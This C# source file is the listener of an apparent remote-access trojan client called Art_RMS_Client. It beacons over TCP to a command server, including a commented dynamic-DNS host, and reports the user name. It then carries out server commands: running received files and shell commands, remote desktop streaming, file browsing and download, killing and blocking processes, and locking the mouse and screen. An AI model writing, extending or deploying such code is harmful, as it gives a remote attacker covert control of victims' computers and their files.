using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Art_RMS_Client.Pages;
using System.IO;

namespace Art_RMS_Client
{
    class Listener
    {
        public static TcpClient Client;
        public static NetworkStream Stream;
        public static List<Object> Forms = new List<object>();
        static byte[] buffer = new byte[1024];

        #region Connect
        public static void Connect()
        {
            while (true)
            {
                try
                {
                    Client = new TcpClient(Settings.host, Convert.ToInt32(Settings.port));
                   // Client = new TcpClient("artrmsclg.ddns.net", 1723);
                    Stream = Client.GetStream();
                    Thread.Sleep(500);
                    string query = "CONNECTION|" + Environment.UserName + "|Successfull connected!|1.0";
                    buffer = Encoding.ASCII.GetBytes(query);
                    Stream.Write(buffer, 0, buffer.Length);
                    Listen();
                }
                catch { Thread.Sleep(15000); }
            }
        }
        #endregion

        #region Listen
        public static void Listen()
        {
            new Thread(CheckConnect).Start();
            buffer = new byte[1024];
            while (true)
            {
                try
                {
                    Thread.Sleep(500);
                    using (var memStream = new MemoryStream())
                    {
                        while (Stream.DataAvailable)
                        {
                            int length = Stream.Read(buffer, 0, 1024);
                            memStream.Write(buffer, 0, length);
                            Thread.Sleep(1);
                        }
                        if (!Client.Connected) { BreakConnect(); break; }
                        if (memStream.Length != 0)
                            Received(memStream.ToArray());
                    }
                }
                catch {BreakConnect(); break;}
            }
        } // Слушаем сервер 
        #endregion

        private static void CheckConnect()
        {
            while (true)
            {
                Thread.Sleep(10000);
                try { Stream.WriteByte((byte)0); }
                catch { break; }
            }

        }
        static void BreakConnect()
        {
            Stream.Close();
            foreach (Pages.Dialog_Chat Frm in Forms)
            {
                Frm.Close_Form();
            }
        }

        public static void Received(byte[] data)
        {
            List<Array> answer = GetMessage(data, 0);
            /*string[] gg = new string[500];
            for (int i = 0; i < answer.Count; i++)
                gg[i] = Encoding.UTF8.GetString((byte[])answer[i]);*/
            switch (Encoding.UTF8.GetString((byte[])answer[0]))
            {
                #region Public Function
                case "MSGBOX":
                    Functions.Send("STATUS|Open MessageBox");
                    string Mess = Encoding.UTF8.GetString((byte[])answer[1]);
                    MessageBox.Show(Mess);
                    break;
                case "OPEN_CHAT_CONNECT":
                    Thread Chat_Thread = new Thread(() =>
                    {
                        Dialog_Chat Chat = new Dialog_Chat();
                        Forms.Add(Chat);
                        Chat.ShowDialog();
                    });
                    Chat_Thread.Start();
                    break;
                case "CHAT_FUNCTION":
                    foreach (Pages.Dialog_Chat Frm in Forms)
                    {
                        if (Frm.Text == "Dialog_Chat")
                        {
                            Frm.Received(answer);
                            break;
                        }
                    }
                    break;
                #endregion

                #region Useful Function

                case "DISCONNECT":
                    Environment.Exit(0);
                    break;
                case "RUN_FILE":
                    Functions.Run_File(Convert.ToInt32(Encoding.UTF8.GetString((byte[])answer[1])), Encoding.UTF8.GetString((byte[])answer[2]), (byte[])GetMessage(data, 3)[3]);
                    break;
                case "OPEN_URL":
                    Functions.Open_URL(Encoding.UTF8.GetString((byte[])answer[1]));
                    break;
                case "START_REMOTE_DESKTOP":
                    for (int i = 0; i < Functions.Thread_Functions.Count; i++)
                        if (Functions.Thread_Functions[i].Name == "REMOTE_DESKTOP")
                            return;
                    Functions.Resp_Desk = true;
                    Thread remote_desktop = new Thread(() => {Functions.Response_Dektop(Encoding.UTF8.GetString((byte[])answer[1])); });
                    remote_desktop.IsBackground = true;
                    remote_desktop.Name = "REMOTE_DESKTOP";
                    Functions.Thread_Functions.Add(remote_desktop);
                    remote_desktop.Start();
                    break;
                case "STOP_REMOTE_DESKTOP":
                    Functions.Stop_Response_Dektop();
                    break;
                case "REMOTE_COMMAND":
                    new Thread(() => { Functions.Remote_Command(Encoding.UTF8.GetString((byte[])answer[1]), Encoding.UTF8.GetString((byte[])GetMessage(data, 2)[2])); }).Start();
                    break;

                #endregion

                #region Power
                case "SLEEP_PC":
                    Functions.Sleep_pc();
                    break;
                case "LOG_OUT_PC":
                    Functions.Log_out_pc();
                    break;
                #endregion

                #region Task manager

                case "GET_TASK_LIST":
                    Functions.Get_Task_List();
                    break;
                case "GET_BLOCKED_PROCESSES":
                    Functions.Get_Blocked_Peocesses();
                    break;
                case "KILL_PROCESS":
                    string a = Encoding.UTF8.GetString((byte[])answer[1]);
                    Functions.Kill_Process(a);
                    break;
                case "BLOCK_PROCESS":
                    Thread block_Porcess = new Thread(() =>
                    {
                        Functions.Block_Process(Encoding.UTF8.GetString((byte[])answer[1]));
                    });
                    block_Porcess.IsBackground = true;
                    block_Porcess.Name = Encoding.UTF8.GetString((byte[])answer[1]);
                    Functions.Thread_Functions.Add(block_Porcess);
                    block_Porcess.Start();
                    break;
                case "UNLOCK_PROCESS":
                    Functions.Unlock_Process(Encoding.UTF8.GetString((byte[])answer[1]));
                    break;

                #endregion

                #region File Manager
                case "GET_FILE_MANAGER":
                    Functions.Get_File_Manager(Encoding.UTF8.GetString((byte[])answer[1]));
                    break;
                case "RUN_FILE_FROM_MANAGER":
                    Functions.Run_Local_File(Encoding.UTF8.GetString((byte[])answer[1]), Convert.ToInt32(Encoding.UTF8.GetString((byte[])answer[2])));
                    break;
                case "FUNCTION_WITH_FILE_OR_DIR_FROM_MANAGER":
                    Functions.Manipulation_with_File_OR_Dir(Encoding.UTF8.GetString((byte[])answer[1]), Encoding.UTF8.GetString((byte[])answer[2]));
                    break;
                case "DOWNLOAD_FILE_FROM_MANAGER":
                    Functions.Manipulation_with_File_OR_Dir("DOWNLOAD_FILE", Encoding.UTF8.GetString((byte[])answer[1]));
                    break;
               
                #endregion

                #region Fun Menu

                case "BLOCK_MOUSE":
                    for (int i = 0; i < Functions.Thread_Functions.Count; i++)
                        if (Functions.Thread_Functions[i].Name == "Block_Mouse")
                            return;
                    Thread block_mouse_potok = new Thread(Functions.Block_Mouse);
                    block_mouse_potok.IsBackground = true;
                    block_mouse_potok.Name = "Block_Mouse";
                    Functions.Thread_Functions.Add(block_mouse_potok);
                    block_mouse_potok.Start();
                    break;
                case "UNLOCK_MOUSE":
                    Functions.Unlock_Mouse();
                    break;
                case "BLOCK_DISPLAY":
                    Fun_Functions.Block_Display();
                    break;
                case "UNLOCK_DISPLAY":
                    Fun_Functions.Unlock_Display();
                    break;
                case "HIDE_ELEMENT_FROM_FUN_MENU":
                    Fun_Functions.Hide_Element(Encoding.UTF8.GetString((byte[])answer[1]), Encoding.UTF8.GetString((byte[])answer[2]));
                    break;
                case "SHOW_ELEMENT_FROM_FUN_MENU":
                    Fun_Functions.Show_Element(Encoding.UTF8.GetString((byte[])answer[1]), Encoding.UTF8.GetString((byte[])answer[2]));
                    break;
                case "CHANGE_WALLPAPER":
                    Fun_Functions.Change_wallpaper((byte[])GetMessage(data, 1)[1]);
                    break;
                case "CHANGE_PARAMETERS_MOUSE":
                    Fun_Functions.Change_Parameters_Mouse(Encoding.UTF8.GetString((byte[])answer[1]), Convert.ToInt32(Encoding.UTF8.GetString((byte[])answer[2])));
                    break;
                case "SET_VOLUME":
                    Fun_Functions.Change_Volume(Encoding.UTF8.GetString((byte[])answer[1]));
                    break;
                case "READ_MESSAGE":
                    Fun_Functions.Read_Message(Encoding.UTF8.GetString((byte[])answer[1]));
                    break;
                    #endregion
            }
        } //Проверка сообщения от сервера

        public static byte[] getFile(int size)
        {
            buffer = null;
            while (true)
            {
                try
                {
                    buffer = new byte[size];
                    int length = Stream.Read(buffer, 0, size);
                    if (length != 0)
                    {
                        return buffer;
                    }
                    else { return null; }
                }
                catch { return null; }
            }
        } //Получение файла

        private static List<Array> GetMessage(byte[] data, int split)
        {
            List<Array> message = new List<Array>();
            int split_i = 0;
            var resp = new List<byte>();
            foreach (var ARRitem in data.Select((value, i) => new { i, value }))
            {
                bool check = split_i >= split && split != 0 ? true : false;
                if (ARRitem.value == (byte)124 && !check)
                {
                    message.Add(resp.Select(item => (byte)item).ToArray());
                    resp.Clear();
                    split_i = split != 0 ? split_i+1 : 0;
                }
                else 
                    resp.Add(ARRitem.value);
                if (data.Length - 1 == ARRitem.i)
                    message.Add(resp.Select(item => (byte)item).ToArray());
            }
            return message;
        }

    }
}
